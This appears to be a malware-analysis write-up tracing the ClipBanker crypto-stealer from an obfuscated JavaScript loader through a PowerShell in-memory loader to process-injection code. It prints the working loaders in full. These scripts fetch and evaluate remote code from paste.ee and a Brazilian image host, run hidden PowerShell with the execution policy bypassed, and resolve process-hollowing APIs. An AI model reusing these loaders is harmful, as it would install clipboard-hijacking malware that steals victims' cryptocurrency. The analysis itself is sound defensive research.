---
tags: InfoStealer
description: ClipBanker is focused on clipboard hijacking and cryptocurrency theft. We followed its journey from a JavaScript loader to in‑memory executable payloads, showing how it monitors clipboard activity to detect and replace cryptocurrency wallet addresses during transactions.
---

## Dissecting ClipBanker: From JavaScript Loader to Process Injection

RedLine Clipper (aka ClipBanker) is specifically designed to steal cryptocurrencies by replacing the user’s system clipboard activities with the wallet address under the control of attackers. 

## Initial JavaScript

```javascript
function TwtgaWCivnsxiQCbwJSLTCoEJMdptJClJHpZjAWDdZiSqltCvhdULoxXBHwyHFsZGOAumfobRmSZYGcnTOqlQIORHhyqfcitfVIVoRXnknNbOnVerxNCyeaBAnMEDuvyWPYATkqBNDZeMFnDOCskmTaUSfpbVTXPKKBNtUyFSBdQbdByWNvZaxWgdUegnKYPirtLGYpA(str) {
    return str.split('').reverse().join('');
}

var oPFGPIuwcHruJTqFXjackEDlcnSzkthlCzIxXlRxaOutOoYGbxOJUKfcrtBMDtjLncxhrEnaotOSkdlvRkrSPphrTeSAxkMlnajBFllHaaMPVqXpMfUyXfABgdmnGxUicFvvXnegWxKqCEcNpydCZTlzoPAHStszEyriqeEaCkwZHyLRCPbAclBysrLOoipeWFgBnPbj = "56wui/d/ee.etsap//:sptth";
var cumuxNDEeacpyaraANJjLJnjKWjsdTrCJBWmgiGbHiuUIbVrZIQDORghDNrMPsyUzaOqvclFsaAspOPMMsRRVxjwjEHSFNjjlaJyfnBefRcZGdPVEHzEDwYZHiYlWgtzZIrqwJncSyvGXRdtQmwOgNmnXYtFaUYsLwaEJLZVsBorPpnRuJbiAmWofsqthdWXRodWaxKM = TwtgaWCivnsxiQCbwJSLTCoEJMdptJClJHpZjAWDdZiSqltCvhdULoxXBHwyHFsZGOAumfobRmSZYGcnTOqlQIORHhyqfcitfVIVoRXnknNbOnVerxNCyeaBAnMEDuvyWPYATkqBNDZeMFnDOCskmTaUSfpbVTXPKKBNtUyFSBdQbdByWNvZaxWgdUegnKYPirtLGYpA(oPFGPIuwcHruJTqFXjackEDlcnSzkthlCzIxXlRxaOutOoYGbxOJUKfcrtBMDtjLncxhrEnaotOSkdlvRkrSPphrTeSAxkMlnajBFllHaaMPVqXpMfUyXfABgdmnGxUicFvvXnegWxKqCEcNpydCZTlzoPAHStszEyriqeEaCkwZHyLRCPbAclBysrLOoipeWFgBnPbj);

var BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL = new ActiveXObject("MSXML2.ServerXMLHTTP");
BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.open("GET", cumuxNDEeacpyaraANJjLJnjKWjsdTrCJBWmgiGbHiuUIbVrZIQDORghDNrMPsyUzaOqvclFsaAspOPMMsRRVxjwjEHSFNjjlaJyfnBefRcZGdPVEHzEDwYZHiYlWgtzZIrqwJncSyvGXRdtQmwOgNmnXYtFaUYsLwaEJLZVsBorPpnRuJbiAmWofsqthdWXRodWaxKM, false);
BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.send();

var zFRcqeVmscmYglMSIKZAFqrssqIFeUgbGdouShnFfqpDAimEMJkAyPxIcPDUpQQAMmYIVtUFfORiLjLCeEUXtOPBVuPvoWYsuhhZOrGMMOgfinDwtmaWyqxlWykOsjqbWlPcJphRbNOKfyAANzexSiOpBsamnhxbXEknDRwbAgKIcMSduPSyCmavuzOxxPFKJyiqQhxu = BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.responseText;

(function() {
    eval(zFRcqeVmscmYglMSIKZAFqrssqIFeUgbGdouShnFfqpDAimEMJkAyPxIcPDUpQQAMmYIVtUFfORiLjLCeEUXtOPBVuPvoWYsuhhZOrGMMOgfinDwtmaWyqxlWykOsjqbWlPcJphRbNOKfyAANzexSiOpBsamnhxbXEknDRwbAgKIcMSduPSyCmavuzOxxPFKJyiqQhxu);
})();
```

Besides the very long annoying variable names, this initial script is quite simple, it takes the string `56wui/d/ee.etsap//:sptth`, reverses it, and executes the contents of that URL.

Now we know where the second stage is hosted, we'll head over and download the contents to investigate further.

## 2nd Stage - Further JavaScript

```javascript
    var gQBnV = false;

    function PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI(LpxIb) {
        return LpxIb.split('').reverse().join('');
    }
   
    var olffySApjnmNzEVCrHdsmIvkvtrmdvjBfknvClSyBGJHuqChGtDdwNjUtRxkkyfJOYUiJGZMAThKDTsUxGJuaNqSbTPvTbbqmefDGsXrinQyOMnXQfeSjWxgZKFIubTWXJNqCxTJwTRbGDBclyLnPEmbnFRmJCPDQxEhyrMtITkhfcVQBxcMaJXujuQBrVucxLrEASLY = PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("♚♛kC♚♛p♚♛wJ♚♛UG♚♛tBQY♚♛4E♚♛rBgb♚♛wE♚♛n♚♛♚♛I♚♛wC♚♛n♚♛♚♛X♚♛EG♚♛0BQY♚♛QE♚♛tBQY♚♛IH♚♛nBwb♚♛IH♚♛QB♚♛X♚♛oD♚♛DBwJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛x♚♛wJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛lBQb♚♛EG♚♛OBwc♚♛IG♚♛WBwJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛y♚♛wJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛n♚♛♚♛I♚♛wC♚♛g♚♛wJ♚♛gG♚♛0B♚♛d♚♛♚♛H♚♛zBgO♚♛8C♚♛v♚♛♚♛c♚♛EG♚♛zB♚♛d♚♛UG♚♛u♚♛QZ♚♛UG♚♛v♚♛♚♛Z♚♛8C♚♛VBQN♚♛cD♚♛LBQa♚♛8C♚♛w♚♛wJ♚♛gC♚♛g♚♛QX♚♛0F♚♛bB♚♛d♚♛MG♚♛lBga♚♛IG♚♛vBwW♚♛♚♛C♚♛s♚♛♚♛b♚♛wG♚♛1Bgb♚♛QC♚♛o♚♛QZ♚♛sG♚♛vBgd♚♛4G♚♛JBgL♚♛kC♚♛n♚♛gb♚♛UH♚♛SBwJ♚♛gC♚♛kBwb♚♛gG♚♛0BQZ♚♛0E♚♛0BQZ♚♛cE♚♛u♚♛QZ♚♛♚♛H♚♛5B♚♛d♚♛QC♚♛g♚♛QP♚♛♚♛C♚♛kBwb♚♛gG♚♛0BQZ♚♛0G♚♛k♚♛wO♚♛kC♚♛n♚♛QM♚♛MH♚♛zBQY♚♛wG♚♛DBgL♚♛MD♚♛5Bgc♚♛EG♚♛yBgY♚♛kG♚♛MBwc♚♛MH♚♛hB♚♛b♚♛ME♚♛n♚♛♚♛K♚♛UG♚♛wBQe♚♛QF♚♛0BQZ♚♛cE♚♛u♚♛Qe♚♛wG♚♛iBQb♚♛UG♚♛zBwc♚♛EE♚♛kBQZ♚♛QG♚♛hBwb♚♛wG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛QZ♚♛♚♛H♚♛5B♚♛d♚♛QC♚♛7♚♛QK♚♛MH♚♛lB♚♛d♚♛kH♚♛CB♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwY♚♛QC♚♛o♚♛♚♛Z♚♛EG♚♛vB♚♛T♚♛oD♚♛6♚♛QX♚♛kH♚♛sBgY♚♛0G♚♛lBwc♚♛MH♚♛BBgL♚♛4G♚♛vBQa♚♛QH♚♛jBQZ♚♛wG♚♛mBQZ♚♛IF♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛kH♚♛sBgY♚♛0G♚♛lBwc♚♛MH♚♛BB♚♛Z♚♛UG♚♛kBQY♚♛8G♚♛sB♚♛J♚♛sD♚♛p♚♛♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwQ♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛o♚♛wZ♚♛4G♚♛pBgc♚♛QH♚♛TB♚♛N♚♛YD♚♛lBwc♚♛EG♚♛CBQb♚♛8G♚♛yBgR♚♛oD♚♛6♚♛QX♚♛QH♚♛yBQZ♚♛YH♚♛uBwb♚♛ME♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛MH♚♛lB♚♛d♚♛kH♚♛CB♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwY♚♛QC♚♛7♚♛QK♚♛gG♚♛0BwZ♚♛4G♚♛lB♚♛T♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛g♚♛♚♛L♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛K♚♛cG♚♛uBQa♚♛IH♚♛0Bwc♚♛IG♚♛1BwU♚♛4C♚♛0B♚♛e♚♛UG♚♛UBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwQ♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛7♚♛♚♛e♚♛UG♚♛kBgb♚♛kE♚♛0Bgc♚♛EG♚♛0Bwc♚♛QC♚♛g♚♛QL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QG♚♛uBQZ♚♛QC♚♛g♚♛QP♚♛♚♛C♚♛oB♚♛d♚♛cG♚♛uBQZ♚♛wE♚♛0♚♛gN♚♛UG♚♛zBQY♚♛IG♚♛k♚♛wO♚♛gG♚♛0BwZ♚♛4G♚♛lB♚♛T♚♛4C♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛I♚♛0D♚♛r♚♛♚♛I♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛I♚♛QH♚♛nBQL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QG♚♛uBQZ♚♛QC♚♛g♚♛♚♛Z♚♛4G♚♛hBQL♚♛♚♛C♚♛w♚♛♚♛I♚♛UG♚♛nBQL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QH♚♛yBQY♚♛QH♚♛zB♚♛J♚♛sD♚♛p♚♛wZ♚♛EG♚♛sBgR♚♛QG♚♛uBQZ♚♛QC♚♛o♚♛gZ♚♛8E♚♛4BQZ♚♛QG♚♛uBQS♚♛4C♚♛0B♚♛e♚♛UG♚♛UBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛♚♛e♚♛UG♚♛kBgb♚♛kE♚♛kBgb♚♛UG♚♛k♚♛wO♚♛kC♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛K♚♛YG♚♛PB♚♛e♚♛UG♚♛kBgb♚♛kE♚♛u♚♛♚♛d♚♛gH♚♛lB♚♛V♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛♚♛C♚♛9♚♛♚♛I♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛cC♚♛+♚♛gP♚♛QE♚♛OBQR♚♛8F♚♛0♚♛gN♚♛UE♚♛TBQQ♚♛IE♚♛8♚♛♚♛P♚♛cC♚♛g♚♛QP♚♛♚♛C♚♛nBQY♚♛wG♚♛GB♚♛Z♚♛4G♚♛lB♚♛J♚♛sD♚♛n♚♛gP♚♛4D♚♛UBgU♚♛EE♚♛UBwU♚♛8F♚♛0♚♛gN♚♛UE♚♛TBQQ♚♛IE♚♛8♚♛♚♛P♚♛cC♚♛g♚♛QP♚♛♚♛C♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛kC♚♛zBQZ♚♛QH♚♛5BgQ♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛gC♚♛nBgb♚♛kG♚♛yB♚♛d♚♛MF♚♛0BQZ♚♛cE♚♛u♚♛♚♛O♚♛YE♚♛UBQV♚♛oD♚♛6♚♛QX♚♛cG♚♛uBQa♚♛QG♚♛vBwY♚♛4G♚♛FBgL♚♛QH♚♛4BQZ♚♛QF♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛QH♚♛4BQZ♚♛QF♚♛lBwZ♚♛EG♚♛tBQa♚♛QC♚♛7♚♛QK♚♛wG♚♛yBQV♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛gC♚♛hB♚♛d♚♛EG♚♛EB♚♛Z♚♛EG♚♛vB♚♛b♚♛4G♚♛3Bwb♚♛QE♚♛u♚♛♚♛d♚♛4G♚♛lBQa♚♛wG♚♛DBgY♚♛UG♚♛3B♚♛J♚♛♚♛C♚♛9♚♛♚♛I♚♛MH♚♛lB♚♛d♚♛kH♚♛CBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛wO♚♛QH♚♛uBQZ♚♛kG♚♛sBwQ♚♛IG♚♛lBwV♚♛4C♚♛0BQZ♚♛4E♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TB♚♛I♚♛QH♚♛jBQZ♚♛oG♚♛iBwT♚♛0C♚♛3BQZ♚♛4E♚♛g♚♛QP♚♛♚♛C♚♛0Bgb♚♛UG♚♛pB♚♛b♚♛ME♚♛iBQZ♚♛cH♚♛k♚♛wO♚♛cC♚♛5♚♛♚♛M♚♛YD♚♛x♚♛QO♚♛UD♚♛y♚♛♚♛M♚♛cD♚♛x♚♛wP♚♛cG♚♛wBga♚♛4C♚♛zBga♚♛8C♚♛sBQY♚♛4G♚♛pBwZ♚♛kG♚♛yBwb♚♛8C♚♛3♚♛QN♚♛ID♚♛v♚♛QM♚♛kD♚♛2♚♛wL♚♛QD♚♛w♚♛♚♛M♚♛8C♚♛zBQZ♚♛cG♚♛hBQb♚♛kG♚♛v♚♛gc♚♛IG♚♛u♚♛Qb♚♛8G♚♛jBgL♚♛MH♚♛uBQZ♚♛cG♚♛hBQb♚♛kG♚♛lB♚♛Z♚♛QG♚♛hBwb♚♛wG♚♛wBQd♚♛8C♚♛v♚♛gO♚♛MH♚♛wB♚♛d♚♛QH♚♛oBwJ♚♛♚♛C♚♛9♚♛♚♛I♚♛wG♚♛yBQV♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J");
    var hanqbbYcWLzDlNxOPncjvQCBQonxVECthpIBwsmoBBvosDsujcOzxzaSUiwwkpZHunsTFbSwqYqacScohDNICrUwvjkGulSfZZmeTtftPaPdvKsQTJQISdssGpxQIUGuxwhWPmoCMGohuYLXDyTwcGOtBtKBHZMXyOJlkQOEhkiqLvzhicJrDPknYXzFTodoezdLgRHq = PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("' = ogidoC$") + 
    olffySApjnmNzEVCrHdsmIvkvtrmdvjBfknvClSyBGJHuqChGtDdwNjUtRxkkyfJOYUiJGZMAThKDTsUxGJuaNqSbTPvTbbqmefDGsXrinQyOMnXQfeSjWxgZKFIubTWXJNqCxTJwTRbGDBclyLnPEmbnFRmJCPDQxEhyrMtITkhfcVQBxcMaJXujuQBrVucxLrEASLY + "';" +
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("S[ = dxujWO$") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("eT.metsy") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("nU::]gnidocnE.tx") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("eG.edoci") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("C.metsyS[(gnirtSt") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("6esaBmorF::]trevno") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("lper.ogidoc$(gnirtS4") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI(";)) )'A','♚♛'(eca") +
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("niw- exe.llehsrewop") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("exe- neddih elytswod") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("N- ssapyb ycilopnoituc") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("moc- eliforPo") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("dxujWO$ dnam");
    var eDiSkbNqurqMJDuUiMjNdhOPQQQBvgCftSEHiubYOGUaguzUTNMYeXrTtQOfKyfoAYstCerExYstbTlKouLwhYrnRQphSSARgdjkjrVfvyUZpnHZUSKwsqxMwNFXqElpakdDRQTBboYYHlOHdpQuaUtcDulXphSoyytwUdssTCfGwUoaWBxOUbiVhnwlqCxQURynpcjj = "\x57\x53\x63\x72\x69\x70\x74\x2E\x53\x68\x65\x6C\x6C"
    var ESlFnRWpugflXfvZqSyJlkwsMpcbzCAvFjVaLHGmHCPVjVevdKGGqImgXdntYCyHpCJZWNwKzrUiJEdtUbSUwZDEcrUscveYRSCVwMyIGRzKcZGjcknRtkmrhtoHYyjrUqVpSuBjUVbcmXfLCWiAdbpEMwWATsqxmdxuDKODAfEFiwTDSExHzcsrUPrmOKWPyRGNlldF = new ActiveXObject(eDiSkbNqurqMJDuUiMjNdhOPQQQBvgCftSEHiubYOGUaguzUTNMYeXrTtQOfKyfoAYstCerExYstbTlKouLwhYrnRQphSSARgdjkjrVfvyUZpnHZUSKwsqxMwNFXqElpakdDRQTBboYYHlOHdpQuaUtcDulXphSoyytwUdssTCfGwUoaWBxOUbiVhnwlqCxQURynpcjj);
    ESlFnRWpugflXfvZqSyJlkwsMpcbzCAvFjVaLHGmHCPVjVevdKGGqImgXdntYCyHpCJZWNwKzrUiJEdtUbSUwZDEcrUscveYRSCVwMyIGRzKcZGjcknRtkmrhtoHYyjrUqVpSuBjUVbcmXfLCWiAdbpEMwWATsqxmdxuDKODAfEFiwTDSExHzcsrUPrmOKWPyRGNlldF.Run("\x70\x6F\x77\x65\x72\x73\x68\x65\x6C\x6C\x20\x2D\x63\x6F\x6D\x6D\x61\x6E\x64 \"" + hanqbbYcWLzDlNxOPncjvQCBQonxVECthpIBwsmoBBvosDsujcOzxzaSUiwwkpZHunsTFbSwqYqacScohDNICrUwvjkGulSfZZmeTtftPaPdvKsQTJQISdssGpxQIUGuxwhWPmoCMGohuYLXDyTwcGOtBtKBHZMXyOJlkQOEhkiqLvzhicJrDPknYXzFTodoezdLgRHq + "\"", 0, false);
```

Again, annoyingly long variable names, we can rename these just to make it a little less of an eye sore.

We can then work out parts of the script, simply by reversing the strings for the PowerShell part, and doing a From Hex operation on the later parts.

![deobfuscated JavaScript showing PowerShell command after string reversal and hex decode](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9838b0c5-600c-4c17-bab6-ef82d75c67a9)

The Base64 element can be analysed by utilising the following Operators in CyberChef:

![CyberChef recipe decoding the base64 PowerShell command from the JavaScript loader](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/de584242-bd66-4c9e-b305-39a9e120e00b)

Which reveals the following:

``` powershell
$imageUrl = 'hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609';$webClient = New-Object System.Net.WebClient;$imageBytes = $webClient.DownloadData($imageUrl);$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);$startFlag = '<<BASE64_START>>';$endFlag =
'<<BASE64_END>>';$startIndex = $imageText.IndexOf($startFlag);$endIndex = $imageText.IndexOf($endFlag);$startIndex -ge 0 -and $endIndex -gt $startIndex;$startIndex += $startFlag.Length;$base64Length = $endIndex - $startIndex;$base64Command = $imageText.Substring($startIndex, $base64Length);$commandBytes =
[System.Convert]::FromBase64String($base64Command);$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);$type = $loadedAssembly.GetType('ClassLibrary3.Class1');$method = $type.GetMethod('Run').Invoke($null, [object[]] ('0/iK75U/d/ee.etsap//:sptth' , '' , '2' , 'VbsName' , '1' , 'C:\ProgramData\',
'LnkName'))
```
## 3rd Stage - Some Executables

There are 2 interesting URLs within this command block:

[-] `hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609`

[-] `hxxps[://]paste[.]ee/d/U57Ki/0`

For the first URL, it reads the bytes between 2 flags present in the strings of an image file and executes them. The 2nd URL is passed as an argument - which will make more sense later.

We can extract the contents of the first by downloading the image, running a strings command, and extracting the code between the `<<BASE64_START>>` and `<<BASE64_END>>` flags.

```
curl https[:]//uploaddeimagens[.]com[.]br/images/004/691/257/original/js.jpg?1702591609 -o test.txt | strings test.txt
```
![strings output showing BASE64_START and BASE64_END flags in the downloaded image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/87dd46b6-366f-44d2-8768-9c26fae6b070)

![base64 blob extracted between flag markers from the steganographic image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7ae91d50-d7f6-42f1-8b17-eaf7dee97fdf)

When decoding this from Base64 we are given an executable file.

The second URL contains a reversed Base64 string which contains another executable.

**1st Executable SHA 256**: `e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54`

**2nd Executable SHA 256**: `8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a`

The first executable appears to be a generic loader / malware deployment framework.

Within the first line after the entry point, we can see the variable `LAbWJK` which is the name given to the 2nd executable, as it was given as an argument in the previous PowerShell command.

![DNSpy showing LAbWJK variable holding the second payload filename passed as argument](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/74401b9a-3d72-4a46-8ecc-ccf43619ed47)

Moving down, there are references to generic persistence mechanisms, which in this case, have not been enabled. 

![DNSpy showing disabled persistence mechanism code in the loader](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/071802e4-6b24-48e3-ad53-319043036be8)

Next, we can see more Base64 content being extracted from an image, reversed, and executed.
![DNSpy showing code to extract reversed base64 from a remote image URL](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fe9c374a-5c80-4d55-870e-77a7635ef61f)

After reversing the string, downloading the image, reversing the base64 and decoding to an executable, we are presented with a binary whose sole purpose is to inject code.

**References to Injection:**
```csharp
private static readonly Class1.Delegate9 delegate9_0 = Class1.smethod_0<Class1.Delegate9>("kern!".Replace("!", "el32"), "Create&".Replace("&", "ProcessA"));
private static readonly Class1.Delegate8 delegate8_0 = Class1.smethod_0<Class1.Delegate8>("%ll".Replace("%", "ntd"), "#ewOfSection".Replace("#", "ZwUnmapVi"));
private static readonly Class1.Delegate7 delegate7_0 = Class1.smethod_0<Class1.Delegate7>("kern!".Replace("!", "el32"), "!ssMemory".Replace("!", "ReadProce"));
private static readonly Class1.Delegate6 delegate6_0 = Class1.smethod_0<Class1.Delegate6>("kern!".Replace("!", "el32"), "WritePro@".Replace("@", "cessMemory"));
private static readonly Class1.Delegate5 delegate5_0 = Class1.smethod_0<Class1.Delegate5>("kern!".Replace("!", "el32"), "qllocEx".Replace("q", "VirtualA"));
private static readonly Class1.Delegate4 delegate4_0 = Class1.smethod_0<Class1.Delegate4>("kern!".Replace("!", "el32"), "#ontext".Replace("#", "GetThreadC"));
